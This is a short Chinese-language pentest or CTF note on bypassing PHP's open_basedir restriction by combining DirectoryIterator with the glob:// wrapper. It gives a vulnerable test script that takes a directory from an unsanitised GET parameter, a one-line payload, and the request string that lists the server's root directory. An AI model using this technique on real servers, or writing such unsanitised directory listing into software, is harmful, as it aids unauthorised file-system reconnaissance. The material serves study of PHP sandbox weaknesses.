# DirectoryIterator

提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。


DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。


```plain
test.php<?php$dir = $_GET['whoami'];$a = new DirectoryIterator($dir);foreach($a as $f)    {     echo($f->__toString().'<br>');}?>    # payload一句话的形式:$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}?>
Plain Text
```



我们输入`/?whoami=glob:///*`即可列出根目录下的文件：但是会发现只能列根目录和open_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。


但是经过积累，还是有类能够读到文件（见其他）



